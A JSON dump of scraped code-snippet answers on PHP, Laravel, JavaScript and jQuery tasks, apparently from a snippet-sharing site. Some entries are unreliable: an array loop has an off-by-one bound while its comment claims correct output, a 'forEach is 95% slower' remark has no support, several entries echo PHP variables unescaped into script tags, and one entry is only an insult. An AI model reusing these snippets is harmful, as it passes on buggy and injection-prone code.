    "title": " it is missing from your system. Install or enable PHP's pcntl extension.",
    "description": "composer install --ignore-platform-reqs\n",
    "reg_date": "2021-10-12T10:15:25.000Z"
  },
  {
    "id": 1966,
    "keyword": null,
    "link": null,
    "title": " item count in cart quantitiy woocommerce",
    "description": "function count_item_in_cart() {     $count = 0;     foreach ( WC()->cart->get_cart() as $cart_item_key => $cart_item ) {         $count++;     }     return $count; }\n",
    "reg_date": "2021-10-12T10:15:25.000Z"
  },
  {
    "id": 1967,
    "keyword": null,
    "link": null,
    "title": " iterate through array javascript",
    "description": "var data = [1, 2, 3, 4, 5, 6];  // traditional for loop for(let i=0; i<=data.length; i++) {   console.log(data[i])  // 1 2 3 4 5 6 }  // using for...of for(let i of data) { \tconsole.log(i) // 1 2 3 4 5 6 }  // using for...in for(let i in data) {   \tconsole.log(i) // Prints indices for array elements \tconsole.log(data[i]) // 1 2 3 4 5 6 }  // using forEach data.forEach((i) => {   console.log(i) // 1 2 3 4 5 6 }) // NOTE ->  forEach method is about 95% slower than the traditional for loop  // using map data.map((i) => {   console.log(i) // 1 2 3 4 5 6 })\nvar colors = [\"red\",\"blue\",\"green\"];  for (var i = 0; i < colors.length; i++) {      console.log(colors[i]);  }\nlet array = ['Item 1', 'Item 2', 'Item 3'];  // Here's 4 different ways for (let index = 0; index < array.length; index++) {   console.log(array[index]); }  for (let index in array) {   console.log(array[index]); }  for (let value of array) {   console.log(value); // Will log value in array }  array.forEach((value, index) => {   console.log(index); // Will log each index   console.log(value); // Will log each value });\nconst array = [\"one\", \"two\", \"three\"] array.forEach(function (item, index) {   console.log(item, index); });\nforeach ($objects as $obj) {    echo $obj->property; }\nfor (var key in validation_messages) {     // skip loop if the property is from prototype     if (!validation_messages.hasOwnProperty(key)) continue;      var obj = validation_messages[key];     for (var prop in obj) {         // skip loop if the property is from prototype         if (!obj.hasOwnProperty(prop)) continue;          // your code         alert(prop + \" = \" + obj[prop]);     } }\n",
    "reg_date": "2021-10-12T10:15:25.000Z"
  },
  {
    "id": 1968,
    "keyword": null,
    "link": null,
    "title": " iteration in php",
    "description": " <?php class MyClass {     public $var1 = 'value 1';     public $var2 = 'value 2';     public $var3 = 'value 3';      protected $protected = 'protected var';     private   $private   = 'private var';      function iterateVisible() {        echo \"MyClass::iterateVisible:\\n\";        foreach ($this as $key => $value) {            print \"$key => $value\\n\";        }     } }  $class = new MyClass();  foreach($class as $key => $value) {     print \"$key => $value\\n\"; } echo \"\\n\";   $class->iterateVisible();  ?>  \n",
    "reg_date": "2021-10-12T10:15:25.000Z"
  },
  {
    "id": 1969,
    "keyword": null,
    "link": null,
    "title": " iterator impliment php",
    "description": " <?php class myIterator implements Iterator {     private $position = 0;     private $array = array(         \"firstelement\",         \"secondelement\",         \"lastelement\",     );        public function __construct() {         $this->position = 0;     }      public function rewind() {         var_dump(__METHOD__);         $this->position = 0;     }      public function current() {         var_dump(__METHOD__);         return $this->array[$this->position];     }      public function key() {         var_dump(__METHOD__);         return $this->position;     }      public function next() {         var_dump(__METHOD__);         ++$this->position;     }      public function valid() {         var_dump(__METHOD__);         return isset($this->array[$this->position]);     } }  $it = new myIterator;  foreach($it as $key => $value) {     var_dump($key, $value);     echo \"\\n\"; } ?>          // output    string(18) \"myIterator::rewind\" string(17) \"myIterator::valid\" string(19) \"myIterator::current\" string(15) \"myIterator::key\" int(0) string(12) \"firstelement\"  string(16) \"myIterator::next\" string(17) \"myIterator::valid\" string(19) \"myIterator::current\" string(15) \"myIterator::key\" int(1) string(13) \"secondelement\"  string(16) \"myIterator::next\" string(17) \"myIterator::valid\" string(19) \"myIterator::current\" string(15) \"myIterator::key\" int(2) string(11) \"lastelement\"  string(16) \"myIterator::next\" string(17) \"myIterator::valid\"  \n",
    "reg_date": "2021-10-12T10:15:25.000Z"
  },
  {
    "id": 1970,
    "keyword": null,
    "link": null,
    "title": " java",
    "description": "Java is a class-based, object-oriented programming language that is designed to have as few implementation dependencies as possible. It is a general-purpose programming language intended to let application developers write once, run anywhere (WORA),[17] meaning that compiled Java code can run on all platforms that support Java without the need for recompilation.[18] Java applications are typically compiled to bytecode that can run on any Java virtual machine (JVM) regardless of the underlying computer architecture. The syntax of Java is similar to C and C++, but has fewer low-level facilities than either of them. The Java runtime provides dynamic capabilities (such as reflection and runtime code modification) that are typically not available in traditional compiled languages. As of 2019, Java was one of the most popular programming languages in use according to GitHub,[19][20] particularly for client-server web applications, with a reported 9 million developers.[21]\npublic class Main {   public static void main(String[] args) {     System.out.println(\"Hello, World!\");   } }\n// Your First Program  class HelloWorld {     public static void main(String[] args) {         System.out.println(\"Hello, World!\");      } }\nSystem.out.println(something)\n\tAn incredible language that receives far more hate than it deserves because of it's poor beginnings. \tEveryone remembers the slow java applets but often fail to understand Java's many positives including:  - compatability with many different systems  - Just-In-Time compilation making it almost as fast as a native language  - the wide range of high-quality and open source libraries developed over    many years  \tSure, it may not look as sexy as Python or NodeJS, but when you're debugging the call stack 50 functions deep, you'll be glad you picked Java\nconst DB_HOST = 'localhost'; const DB_NAME = 'DB_Name';\t\t\t//Name of the database const DB_USERNAME = 'username';\t\t//Username to use const DB_PASSWORD = 'Password';\t\t//Password for that user   // Data Source Name $dsn = \"mysql:host=\" . DB_HOST . \";dbname=\" . DB_NAME;  $options = [     PDO::ATTR_EMULATE_PREPARES   => false, // turn off emulation mode for \"real\" prepared statements     PDO::ATTR_ERRMODE            => PDO::ERRMODE_EXCEPTION, //turn on errors in the form of exceptions     PDO::ATTR_DEFAULT_FETCH_MODE => PDO::FETCH_OBJ, //make the default fetch be an anonymous object with column names as properties ];  //Create PDO instance try {     $pdo = new PDO($dsn, DB_USERNAME, DB_PASSWORD, $options); } catch (PDOException $e) {     echo 'Connection failed: ' . $e->getMessage(); }\npublic class Example {   public static void main(String[] args) {   \tSystem.out.println(\"Hello, world!\");    } }\nJava is a high-level, class-based, object-oriented programming language that is designed to have as few implementation dependencies as possible. It is a general-purpose programming language intended to let application developers write once, run anywhere (WORA),[17] meaning that compiled Java code can run on all platforms that support Java without the need for recompilation.[18] Java applications are typically compiled to bytecode that can run on any Java virtual machine (JVM) regardless of the underlying computer architecture. The syntax of Java is similar to C and C++, but has fewer low-level facilities than either of them. The Java runtime provides dynamic capabilities (such as reflection and runtime code modification) that are typically not available in traditional compiled languages. As of 2019, Java was one of the most popular programming languages in use according to GitHub,[19][20] particularly for client-server web applications, with a reported 9 million developers\nJava is a programming lanuaguge\nWhy is there no grepper answer here \n",
    "reg_date": "2021-10-12T10:15:25.000Z"
  },
  {
    "id": 1971,
    "keyword": null,
    "link": null,
    "title": " javascript inside php",
    "description": "<?php   FONCTION_PHP(){   ?>    <script>     function fonctionJavaScript(){   }     </script> <?php \t}   ?>\n",
    "reg_date": "2021-10-12T10:15:25.000Z"
  },
  {
    "id": 1972,
    "keyword": null,
    "link": null,
    "title": " javascript php loop",
    "description": "<?php $s=array('a','b','c','d','e','f'); $s_to_json=json_encode((array)$s); ?>  <script type=\"text/javascript\">  var fromPHP=<? echo $s_to_json ?>;  for (i=0; i<fromPHP.length; i++) {  yourValue=fromPHP[i];  }  </script>\n",
    "reg_date": "2021-10-12T10:15:25.000Z"
  },
  {
    "id": 1973,
    "keyword": null,
    "link": null,
    "title": " javascript php variable",
    "description": "<script type=\"text/javascript\">    var php_var = \"<?php echo $php_var; ?>\"; </script>\n<script>    var res = \"success\"; </script> <?php    echo \"<script>document.writeln(res);</script>\"; ?>\n",
    "reg_date": "2021-10-12T10:15:26.000Z"
  },
  {
    "id": 1974,
    "keyword": null,
    "link": null,
    "title": " jetstream seed user with team",
    "description": "\\App\\Models\\User::factory(10)->withPersonalTeam()->create();\n",
    "reg_date": "2021-10-12T10:15:26.000Z"
  },
  {
    "id": 1975,
    "keyword": null,
    "link": null,
    "title": " join 2 tables laravel",
    "description": "use Illuminate\\Support\\Facades\\DB;  $users = DB::table('users')             ->join('contacts', 'users.id', '=', 'contacts.user_id')             ->join('orders', 'users.id', '=', 'orders.user_id')             ->select('users.*', 'contacts.phone', 'orders.price')             ->get();\n",
    "reg_date": "2021-10-12T10:15:26.000Z"
  },
  {
    "id": 1976,
    "keyword": null,
    "link": null,
    "title": " join array of strings php",
    "description": "$arr = array('Hello','World!','Beautiful','Day!'); echo join(\", \",$arr);\n$values = array_map('array_pop', $array); $imploded = implode(',', $values); \n$arr = array('Hello','World!','Beautiful','Day!'); echo join(\",\",$arr);\n",
    "reg_date": "2021-10-12T10:15:26.000Z"
  },
  {
    "id": 1977,
    "keyword": null,
    "link": null,
    "title": " join cakphp",
    "description": "'joins' => array(         array(             'table' => Environment::read('table_prefix') . 'image_type_languages',              'alias' => 'language',             'type' => 'INNER',             'conditions'=> array(                 'ImageType.id = language.image_type_id',                 'language.alias = \\'' . $language . '\\'',             )         ),     ),\n",
    "reg_date": "2021-10-12T10:15:26.000Z"
  },
  {
    "id": 1978,
    "keyword": null,
    "link": null,
    "title": " join in laravel",
    "description": "Inner Join \t: ->join('contacts', 'users.id', '=', 'contacts.user_id') Left Join \t: ->leftJoin('posts', 'users.id', '=', 'posts.user_id') Right Join \t: ->rightJoin('posts', 'users.id', '=', 'posts.user_id') Cross Join \t: ->crossJoin('colors')  Advance Queries :  -----------------   \t\t->join('contacts', function ($join) {             $join->on('users.id', '=', 'contacts.user_id')                  ->where('contacts.user_id', '>', 5);         })   \nuse Illuminate\\Support\\Facades\\DB;  $users = DB::table('users')             ->join('contacts', 'users.id', '=', 'contacts.user_id')             ->join('orders', 'users.id', '=', 'orders.user_id')             ->select('users.*', 'contacts.phone', 'orders.price')             ->get();\nDB::table(..)->select(..)->whereNotIn('book_price', [100,200])->get();\n$users = DB::table('users')             ->join('contacts', 'users.id', '=', 'contacts.user_id')             ->join('orders', 'users.id', '=', 'orders.user_id')             ->select('users.*', 'contacts.phone', 'orders.price')             ->get();\nDB::table('users')             ->where('name', '=', 'John')             ->where(function ($query) {                 $query->where('votes', '>', 100)                       ->orWhere('title', '=', 'Admin');             })             ->get();\n$subCategories = Subcategory::join('categories', 'subcategories.category_id', '=', 'categories.id')                               ->select('subcategories.*', 'categories.name AS cname')                               ->orderBy('id', 'desc')                               ->get(); \n",
    "reg_date": "2021-10-12T10:15:26.000Z"
  },
  {
    "id": 1979,
    "keyword": null,
    "link": null,
    "title": " join in laravel eloquent",
    "description": "Inner Join \t: ->join('contacts', 'users.id', '=', 'contacts.user_id') Left Join \t: ->leftJoin('posts', 'users.id', '=', 'posts.user_id') Right Join \t: ->rightJoin('posts', 'users.id', '=', 'posts.user_id') Cross Join \t: ->crossJoin('colors')  Advance Queries :  -----------------   \t\t->join('contacts', function ($join) {             $join->on('users.id', '=', 'contacts.user_id')                  ->where('contacts.user_id', '>', 5);         })   \nuse Illuminate\\Support\\Facades\\DB;  $users = DB::table('users')             ->join('contacts', 'users.id', '=', 'contacts.user_id')             ->join('orders', 'users.id', '=', 'orders.user_id')             ->select('users.*', 'contacts.phone', 'orders.price')             ->get();\n$users = DB::table('users')             ->join('contacts', 'users.id', '=', 'contacts.user_id')             ->join('orders', 'users.id', '=', 'orders.user_id')             ->select('users.*', 'contacts.phone', 'orders.price')             ->get();\n $customer = DB::table('customers')                 ->join('shops', 'customers.shop_id', '=', 'shops.shop_id')                 ->where('customer_contact', $contact_no)                 ->get();\n$users = DB::table('users')                     ->whereIn('id', [1, 2, 3])                     ->get();\n$subCategories = Subcategory::join('categories', 'subcategories.category_id', '=', 'categories.id')                               ->select('subcategories.*', 'categories.name AS cname')                               ->orderBy('id', 'desc')                               ->get(); \n",
    "reg_date": "2021-10-12T10:15:26.000Z"
  },
  {
    "id": 1980,
    "keyword": null,
    "link": null,
    "title": " join table laravel count",
    "description": "DB::table('users')             ->join('contacts', 'users.id', '=', 'contacts.user_id')             ->join('orders', 'users.id', '=', 'orders.user_id')             ->select('users.id', 'contacts.phone', 'orders.price')             ->get();\n$areas = Area::select('areas.*', DB::raw('count(area_id) as connections')) \t->leftJoin('object_areas', 'object_areas.area_id', '=', 'areas.id') \t->groupBy('areas.id') \t->get();\nDB::table('users')         ->join('contacts', function($join)         {             $join->on('users.id', '=', 'contacts.user_id')->orOn(...);         })         ->get();\nDB::table('users')         ->leftJoin('posts', 'users.id', '=', 'posts.user_id')         ->get();\n",
    "reg_date": "2021-10-12T10:15:26.000Z"
  },
  {
    "id": 1981,
    "keyword": null,
    "link": null,
    "title": " jquery ajax 500 internal server error php",
    "description": "// That mean you have error in server side // A 500 error is not a problem with your JS - it s server-side // Add this code at the top of your PHP:  ini_set('display_errors', 1);  error_reporting(E_ALL);  // That will show you what the problem is in your PHP code. If it s a syntax error (seems quite likely for a code 500)  // Comment all code in your page PHP and make simple sentense \" Hello this is my page \" and test  // if all good then find your error\n",
    "reg_date": "2021-10-12T10:15:26.000Z"
  },
  {
    "id": 1982,
    "keyword": null,
    "link": null,
    "title": " jquery click not working",
    "description": "$(document).on( 'click', '.classname', function () {  alert('clicked'); });  **** Another Method **** // where #wrapper is a static element in which you add the dynamic links. $( '#wrapper' ).on( 'click', 'a', function () { alert('clicked'); });\n$(document).ready(function() {   $(\"#clicker\").click(function () {     alert(\"Hello!\");     $(\".hide_div\").hide();   }); });\n",
    "reg_date": "2021-10-12T10:15:26.000Z"
  },
  {
    "id": 1983,
    "keyword": null,
    "link": null,
    "title": " js change h1 value",
    "description": " document.getElementById(\"yourH1_element_Id\").innerHTML = \"yourTextHere\";  \n",
    "reg_date": "2021-10-12T10:15:27.000Z"
  },
  {
    "id": 1984,
    "keyword": null,
    "link": null,
    "title": " js check if div is empty",
    "description": "if ($('#element').is(':empty')){   //do something }\n",
    "reg_date": "2021-10-12T10:15:27.000Z"
  },
  {
    "id": 1985,
    "keyword": null,
    "link": null,
    "title": " js var to php",
    "description": "<script type=\"text/javascript\"> var abc= 'this is text'; <?php $abc = \"<script>document.write(abc)</script>\"?>    </script> <?php echo $abc;?>\n<script type=\"text/javascript\">    var php_var = \"<?php echo $php_var; ?>\"; </script>\n<script>    var res = \"success\"; </script> <?php    echo \"<script>document.writeln(res);</script>\"; ?>\n<script> var p1 = \"success\"; </script>  <?php echo \"<script>document.writeln(p1);</script>\"; ?>\n<script type=\"text/javascript\"> // boolean outputs \"\" if false, \"1\" if true var bool = \"<?php echo $bool ?>\";   // numeric value, both with and without quotes var num = <?php echo $num ?>; // 7 var str_num = \"<?php echo $num ?>\"; // \"7\" (a string)  var str = \"<?php echo $str ?>\"; // \"A string here\" </script>\n",
    "reg_date": "2021-10-12T10:15:27.000Z"
  },
  {
    "id": 1986,
    "keyword": null,
    "link": null,
    "title": " json decode php multidimensional array",
    "description": "{\"Isp\":[{\"id\":1,\"Name\":\"gmail\",\"list_name\":\"vl_leanding\",\"path\":\"gmail\\/vl_leanding.txt\",\"created_at\":\"2020-12-05T16:58:20.000000Z\",\"updated_at\":\"2020-12-05T16:58:20.000000Z\"}],\"Offre\":{}}\n",
    "reg_date": "2021-10-12T10:15:27.000Z"
  },
  {
    "id": 1987,
    "keyword": null,
    "link": null,
    "title": " json encode()",
    "description": " <?php // A valid json string $json[] = '{\"Organization\": \"PHP Documentation Team\"}';  // An invalid json string which will cause an syntax  // error, in this case we used ' instead of \" for quotation $json[] = \"{'Organization': 'PHP Documentation Team'}\";   foreach ($json as $string) {     echo 'Decoding: ' . $string;     json_decode($string);      switch (json_last_error()) {         case JSON_ERROR_NONE:             echo ' - No errors';         break;         case JSON_ERROR_DEPTH:             echo ' - Maximum stack depth exceeded';         break;         case JSON_ERROR_STATE_MISMATCH:             echo ' - Underflow or the modes mismatch';         break;         case JSON_ERROR_CTRL_CHAR:             echo ' - Unexpected control character found';         break;         case JSON_ERROR_SYNTAX:             echo ' - Syntax error, malformed JSON';         break;         case JSON_ERROR_UTF8:             echo ' - Malformed UTF-8 characters, possibly incorrectly encoded';         break;         default:             echo ' - Unknown error';         break;     }      echo PHP_EOL; } ?>  \n$person = array(      \"name\" => \"Johny Carson\",      \"title\" => \"CTO\" );  $personJSON=json_encode($person);//returns JSON string\njson_encode(['name' => 'Jake', 'country' => 'Philippines'])\n   <?php $age = array(\"Peter\"=>35, \"Ben\"=>37, \"Joe\"=>43);     echo json_encode($age); ?>  \n",
    "reg_date": "2021-10-12T10:15:27.000Z"
  },
  {
    "id": 1988,
    "keyword": null,
    "link": null,
    "title": " json encode json decode php examples",
    "description": "$personJSON = '{\"name\":\"Johny Carson\",\"title\":\"CTO\"}';  $person = json_decode($personJSON);  echo $person->name; // Johny Carson\njson_encode used when PHP retrieve data and convert Array() to [] !!!! $arr = array('a' => 1, 'b' => 2, 'c' => 3, 'd' => 4, 'e' => 5); echo json_encode($arr); //output {\"a\":1,\"b\":2,\"c\":3,\"d\":4,\"e\":5} access from js file data.a, data.b,data.c... ----------------------------------------------   $json = '{\"a\":1,\"b\":2,\"c\":3,\"d\":4,\"e\":5}'; json_decode($json, true); //true turns object to associative array;  //output array(5) {     [\"a\"] => int(1)     [\"b\"] => int(2)     [\"c\"] => int(3)     [\"d\"] => int(4)     [\"e\"] => int(5) }  \n",
    "reg_date": "2021-10-12T10:15:27.000Z"
  },
  {
    "id": 1989,
    "keyword": null,
    "link": null,
    "title": " json php",
    "description": "function IsJsonString(str) {     try {         JSON.parse(str);     } catch (e) {         return false;     }     return true; }\n//Json Encode  $person = array(      \"name\" => \"KINGASV\",      \"title\" => \"CTO\" );  $personJSON=json_encode($person);//returns JSON string  //Json Decode  $personJSON = '{\"name\":\"KINGASV\",\"title\":\"CTO\"}';  $person = json_decode($personJSON);  echo $person->name; // KINGASV \nheader('Content-type: application/json'); echo json_encode($array);\n$data = json_decode(file_get_contents('php://input'), true); print_r($data); echo $data; \n<?php $jsonurl = \"http://api.wipmania.com/json\"; $json = file_get_contents($jsonurl); var_dump(json_decode($json)); ?>\n//Json Encode  $person = array(      \"name\" => \"KINGASV\",      \"title\" => \"CTO\" );  $personJSON=json_encode($person);//returns JSON string  //Json Decode  $personJSON = '{\"name\":\"KINGASV\",\"title\":\"CTO\"}';  $person = json_decode($personJSON);  echo $person->name; // KINGASV  \n",
    "reg_date": "2021-10-12T10:15:27.000Z"
  },
  {
    "id": 1990,
    "keyword": null,
    "link": null,
    "title": " json stringify php decode",
    "description": "$personJSON = '{\"name\":\"Johny Carson\",\"title\":\"CTO\"}';  $person = json_decode($personJSON);  echo $person->name; // Johny Carson\n$postedData = $_POST[\"JSONfullInfoArray\"]; $tempData = str_replace(\"\\\\\", \"\",$postedData); $cleanData = json_decode($tempData); var_dump($cleanData);\n",
    "reg_date": "2021-10-12T10:15:27.000Z"
  },
  {
    "id": 1991,
    "keyword": null,
    "link": null,
    "title": " json to array php",
    "description": "<?php $data = ['name' => 'John', 'age' => 35]; header('Content-type: Application/json'); echo json_encode($data); \n$myArr = array(\"apple\", \"banana\", \"mango\", \"jackfruit\");  $toJSON = json_encode($myArr);  echo $toJSON;\n<?php   // JSON string   $someJSON = '[{\"name\":\"Jonathan Suh\",\"gender\":\"male\"},{\"name\":\"William Philbin\",\"gender\":\"male\"},{\"name\":\"Allison McKinnery\",\"gender\":\"female\"}]';    // Convert JSON string to Array   $someArray = json_decode($someJSON, true);   print_r($someArray);        // Dump all data of the Array   echo $someArray[0][\"name\"]; // Access Array data    // Convert JSON string to Object   $someObject = json_decode($someJSON);   print_r($someObject);      // Dump all data of the Object   echo $someObject[0]->name; // Access Object data ?> \n//Json Encode  $person = array(      \"name\" => \"KINGASV\",      \"title\" => \"CTO\" );  $personJSON=json_encode($person);//returns JSON string  //Json Decode  $personJSON = '{\"name\":\"KINGASV\",\"title\":\"CTO\"}';  $person = json_decode($personJSON);  echo $person->name; // KINGASV \n<?php  $myArr = '{   \"neworder\": {     \"-newfolder\": \"NO\",     \"auth\": {       \"-extra\": \"8\",       \"-login\": \"login\",       \"-pass\": \"pass\"     },     \"order\": {       \"-orderno\": \"111111\",       \"barcode\": \"111111\",       \"sender\": {         \"company\": \"Ministry of Internal Affairs\",         \"person\": \"I. I. Ivanov\",         \"phone\": \"123-45-67\",         \"town\": \"Saint-Petersburg\",         \"address\": \"Petrovka Str., 38, room 35\",         \"date\": \"2021-03-22\",         \"time_min\": \"09:00\",         \"time_max\": \"14:00\"       },       \"receiver\": {         \"company\": \"Ministry of Internal Affairs\",         \"person\": \"Tom Wale\",         \"phone\": \"123-45-67\",         \"zipcode\": \"125480\",         \"town\": {           \"-regioncode\": \"78\",           \"-country\": \"RU\",           \"#text\": \"Saint-Petersburg\"         },         \"address\": \"Petrovka Str., 38, room 35\",         \"pvz\": \"124\",         \"inn\": \"1112223335\",         \"date\": \"2021-03-22\",         \"time_min\": \"09:00\",         \"time_max\": \"14:00\",         \"deliveryPIN\": \"1234\",         \"coords\": {           \"-lat\": \"55.680327\",           \"-lon\": \"37.604456\"         }       },       \"return\": \"NO\",       \"weight\": \"5.1\",       \"return_weight\": \"5.1\",       \"quantity\": \"2\",       \"paytype\": \"CASH\",       \"service\": \"2\",       \"return_service\": \"1\",       \"type\": \"3\",       \"return_type\": \"3\",       \"courier\": \"22\",       \"price\": \"387.5\",       \"deliveryprice\": {         \"-VATrate\": \"20\",         \"#text\": \"150\"       },       \"inshprice\": \"387.5\",       \"receiverpays\": \"NO\",       \"discount\": \"120\",       \"enclosure\": \"Kids toys\",       \"instruction\": \"Check in the presence of the buyer, sign acceptance certificate\",       \"department\": \"Accounting\",       \"pickup\": \"NO\",       \"acceptpartially\": \"NO\",       \"costcode\": \"cc12345\",       \"items\": {         \"item\": [           {             \"-extcode\": \"abc123\",             \"-quantity\": \"1\",             \"-mass\": \"0.2\",             \"-retprice\": \"37.5\",             \"-VATrate\": \"0\",             \"-barcode\": \"2345625213125\",             \"-textArticle\": \"1\",             \"-article\": \"1\",             \"-volume\": \"3\",             \"-origincountry\": \"AUT\",             \"-GTD\": \"321546654\",             \"-excise\": \"15.20\",             \"-suppcompany\": \"LLC \\\"Miller and Partners\\\"\",             \"-suppphone\": \"79161234567\",             \"-suppINN\": \"1112223334\",             \"-governmentCode\": \"11223311\",             \"#text\": \"Race car\"           },           {             \"-extcode\": \"abc124\",             \"-quantity\": \"2\",             \"-mass\": \"2\",             \"-retprice\": \"100\",             \"-inshprice\": \"100\",             \"-VATrate\": \"10\",             \"-barcode\": \"4645625213138\",             \"-article\": \"2\",             \"-length\": \"10\",             \"-width\": \"20\",             \"-height\": \"30\",             \"-origincountry\": \"004\",             \"#text\": \"Princess castle\"           },           {             \"-extcode\": \"abc125\",             \"-quantity\": \"3\",             \"-mass\": \"0.3\",             \"-retprice\": \"50\",             \"-inshprice\": \"50\",             \"-barcode\": \"2345625213126\",             \"-itemcode\": \"44123\",             \"-article\": \"3\",             \"-type\": \"1\",             \"#text\": \"Clay mass\"           }         ]       },       \"packages\": {         \"package\": [           {             \"-strbarcode\": \"ORD0000001\",             \"-mass\": \"1\",             \"-message\": \"\"           },           {             \"-strbarcode\": \"ORD0000002\",             \"-mass\": \"2.5\",             \"-message\": \"\",             \"-length\": \"10\",             \"-width\": \"20\",             \"-height\": \"30\"           }         ]       },       \"deliveryset\": {         \"-above_price\": \"100\",         \"-return_price\": \"1000\",         \"-VATrate\": \"10\",         \"below\": [           {             \"-below_sum\": \"500\",             \"-price\": \"500\",             \"-self-closing\": \"true\"           },           {             \"-below_sum\": \"2000\",             \"-price\": \"300\",             \"-self-closing\": \"true\"           }         ]       },             \"overall_volume\": \"81\",       \"userid\": \"123\",       \"groupid\": \"456\"     }   } }';     print_r(json_decode($myArr)); ?> \n//2 ways   //this is for string from $_REQUEST,$_POST to array $jsonText = $_REQUEST['myJSON']; $decodedText = html_entity_decode($jsonText); $myArray = json_decode($decodedText, true);  //this is for json to array $assosiative_array = json_decode(json_encode($jsonText),true);\n",
    "reg_date": "2021-10-12T10:15:27.000Z"
  },
  {
    "id": 1992,
    "keyword": null,
    "link": null,
    "title": " key of last element php",
    "description": "//(PHP 7 >= 7.3.0) $key = array_key_last($data);  //ALL PHP Versions end($data);         // move the internal pointer to the end of the array $key = key($data);  // fetches the key of the element pointed to by the internal pointer  \n",
    "reg_date": "2021-10-12T10:15:27.000Z"
  },
  {
    "id": 1993,
    "keyword": null,
    "link": null,
    "title": " kill laravel server",
    "description": "sudo kill $(sudo lsof -t -i:port_number) \n",
    "reg_date": "2021-10-12T10:15:27.000Z"
  },
  {
    "id": 1994,
    "keyword": null,
    "link": null,
    "title": " kill php process",
    "description": "kill -9 $(pgrep -f phpstorm) \nkill $(ps aux | grep '[p]hp' | awk '{print $2}')\nps -ef | grep phpstorm \nkill $(ps aux | grep '[n]ginx' | awk '{print $2}')\nkill $(ps aux | grep '[m]ysql' | awk '{print $2}')\n",
    "reg_date": "2021-10-12T10:15:28.000Z"
  },
  {
    "id": 1995,
    "keyword": null,
    "link": null,
    "title": " kill php process mac",
    "description": "kill $(ps aux | grep '[p]hp' | awk '{print $2}')\n",
    "reg_date": "2021-10-12T10:15:28.000Z"
  },
  {
    "id": 1996,
    "keyword": null,
    "link": null,
    "title": " kill phpstorm",
    "description": "kill -9 $(pgrep -f phpstorm) \nps -ef | grep phpstorm \nCommands\n",
    "reg_date": "2021-10-12T10:15:28.000Z"
  },
  {
    "id": 1997,
    "keyword": null,
    "link": null,
    "title": " know php file name",
    "description": "basename(__FILE__, '.php'); \n",
    "reg_date": "2021-10-12T10:15:28.000Z"
  },
  {
    "id": 1998,
    "keyword": null,
    "link": null,
    "title": " l5 swagger header sample",
    "description": "//this sample or:  /** @OA\\Info(title=\"My First API\", version=\"0.1\") */   //then:  /**      * @OA\\Post(      *     path=\"/v1/api/endpoint\",      *     summary=\"My summary here\",      *     operationId=\"endpointOperationId\",      *     tags={\"Tag\"},      *     @OA\\Parameter(      *         name=\"Accept-Language\",      *         in=\"header\",      *         description=\"Set language parameter by RFC2616 <https://www.w3.org/Protocols/rfc2616/rfc2616-sec14.html#sec14.4>\",      *         @OA\\Schema(      *             type=\"string\"      *         )      *     ),      *     @OA\\Response(      *          ref=\"success\",      *          response=200,      *          description=\"OK\"      *      ),      *     @OA\\Response(      *          response=404,      *          description=\"Not found\"      *      ),      *  )       or:            *     @OA\\Parameter(      *          name=\"questionId\",      *          required=true,      *          in=\"path\",      *         @OA\\Schema(      *             type=\"integer\"      *         ),      *         example=1,      *     ),            \n",
    "reg_date": "2021-10-12T10:15:28.000Z"
  },
  {
    "id": 1999,
    "keyword": null,
    "link": null,
    "title": " lara clette",
    "description": "nique ta mere\n",
    "reg_date": "2021-10-12T10:15:28.000Z"
  },
  {
    "id": 2000,
    "keyword": null,
    "link": null,
    "title": " larael drop foreign key",
    "description": "Schema::table('posts', function (Blueprint $table) { \t$table->dropForeign(['category_id']); });\n$table->dropForeign('posts_user_id_foreign');\n// Searched, laravel drop foreign column Schema::table('users', function (Blueprint $table) {     $table->dropColumn(['votes', 'avatar', 'location']); });\n$table->dropIndex(['state']); // Drops index 'geo_state_index'\n",
    "reg_date": "2021-10-12T10:15:28.000Z"
  },
  {
    "id": 2001,
    "keyword": null,
    "link": null,
    "title": " laraval composer installer",
    "description": "composer global require \"laravel/installer=~1.1\"\n",
    "reg_date": "2021-10-12T10:15:28.000Z"
  },
  {
    "id": 2002,
    "keyword": null,
    "link": null,
    "title": " larave Soft Deletes",
    "description": "// Retrieve flight by name, or create it if it doesn't exist... $flight = App\\Flight::firstOrCreate(['name' => 'Flight 10']);  // Retrieve flight by name, or create it with the name, delayed, and arrival_time attributes... $flight = App\\Flight::firstOrCreate(     ['name' => 'Flight 10'],     ['delayed' => 1, 'arrival_time' => '11:30'] );  // Retrieve by name, or instantiate... $flight = App\\Flight::firstOrNew(['name' => 'Flight 10']);  // Retrieve by name, or instantiate with the name, delayed, and arrival_time attributes... $flight = App\\Flight::firstOrNew(     ['name' => 'Flight 10'],     ['delayed' => 1, 'arrival_time' => '11:30'] );\nSchema::table('flights', function (Blueprint $table) {     $table->softDeletes(); });\n",
    "reg_date": "2021-10-12T10:15:28.000Z"
  },
  {
    "id": 2003,
    "keyword": null,
    "link": null,
    "title": " larave whereNotNull",
    "description": "# whereNull $users = DB::table('users')   ->whereNull('updated_at')   ->get(); # whereNotNull $users = DB::table('users')   ->whereNotNull('updated_at')   ->get();\n",
    "reg_date": "2021-10-12T10:15:29.000Z"
  },
  {
    "id": 2004,
    "keyword": null,
    "link": null,
    "title": " laravel's collection pagination",
    "description": "        // this goes to -> \\app\\Providers\\AppServiceProvider -> boot function          use Illuminate\\Pagination\\LengthAwarePaginator;         use Illuminate\\Support\\Collection;  \t\tCollection::macro('paginate', function($perPage, $total = null, $page = null, $pageName = 'page') {             $page = $page ?: LengthAwarePaginator::resolveCurrentPage($pageName);             return new LengthAwarePaginator(                 $this->forPage($page, $perPage),                 $total ?: $this->count(),                 $perPage,                 $page,                 [                     'path' => LengthAwarePaginator::resolveCurrentPath(),                     'pageName' => $pageName,                 ]             );         });  \t// this goes to controller. collection->paginate(1); \t$event->paginate(1); \n",
    "reg_date": "2021-10-12T10:15:29.000Z"
  },
  {
    "id": 2005,
    "keyword": null,
    "link": null,
    "title": " laravel/framework[v7.29.0, ..., 7.x-dev] require ext-mbstring * -> it is missing from your system. Install or enable PHP's mbstring extension.",
    "description": "Install the required mbstring extension  sudo apt-get install php-mbstring  In Dockerfile you should add:  RUN docker-php-ext-install mbstring\n",
    "reg_date": "2021-10-12T10:15:29.000Z"
  },
  {
    "id": 2006,
    "keyword": null,
    "link": null,
    "title": " laravel/ui for laravel 7",
